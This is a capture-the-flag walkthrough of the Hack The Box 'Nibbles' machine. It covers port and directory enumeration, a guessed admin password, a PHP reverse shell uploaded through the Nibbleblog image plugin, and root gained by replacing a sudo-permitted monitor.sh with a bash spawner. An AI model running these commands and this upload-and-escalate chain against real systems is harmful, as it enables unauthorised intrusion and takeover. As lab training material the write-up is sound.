# About
Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most. 
# Enumeration
```
nmap 10.129.23.16 -p- -sV -sC --open
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Web
First you need to find the actual blog on the webpage

```
nibbleblog
```

The blog page is being run by NibbleBlog. Lets continue by doing some Web Directory enumeration and see what we can find.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.23.16/nibbleblog/FUZZ -recursion -recursion-depth 1
```

```
content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 39ms]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 43ms]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 41ms]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 40ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 40ms]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 41ms]
```

Testing one of these directories shows us it has directory lists enabled.

![](Images/Pasted%20image%2020250502102541.png)

We can find the users.xml file under the private directory at `/nibbleblog/content/private/users.xml`

![](Images/Pasted%20image%2020250502102639.png)

Now we just have to get a password to authenticate with and find the respective login portal.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.129.23.16/nibbleblog/FUZZ -e php

content                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 55ms]
themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 42ms]
admin                   [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 40ms]
plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 45ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 40ms]
languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 48ms]
```

`http://10.129.23.16/nibbleblog/admin.php` is our login page. Along with making a quick custom wordlist will get us authentication

```
nibble
nibbleblog
admin
nibble123
nibbles
Nibble
Nibbleblog
Nibble123
Nibbles
```

`admin:nibbles`

# Exploitation

Within Nibbleblog we found a plugin that allows file upload, lets see if we can obtain a reverse shell using this as it does not check our file extension so we can upload anything we want.

![](Images/Pasted%20image%2020250502104000.png)

```
cp /usr/share/seclists/Web-Shells/laudanum-1.0/php/php-reverse-shell.php .
```

Adjust shell to match our hostname and upload the file.

![](Images/Pasted%20image%2020250502104250.png)

Now we will call upon the file in order to execute it. `http://10.129.23.16/nibbleblog/content/private/plugins/my_image/`

![](Images/Pasted%20image%2020250502104422.png)

Upgrade our shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](Images/Pasted%20image%2020250502104550.png)

# Priv Esc

Some mild enumeration finds us the our next step.

![](Pasted%20image%2020250502104740.png)

The account we currently have a shell on has permissions to run the file monitor.sh as root without providing a password. We can leverage this to get escalation.

Remove the original file and replace it with

```
echo -e '#!/bin/bash\nbash' > monitor.sh

#!/bin/bash
bash
```

![](Pasted%20image%2020250502105601.png)

![](Pasted%20image%2020250502105641.png)














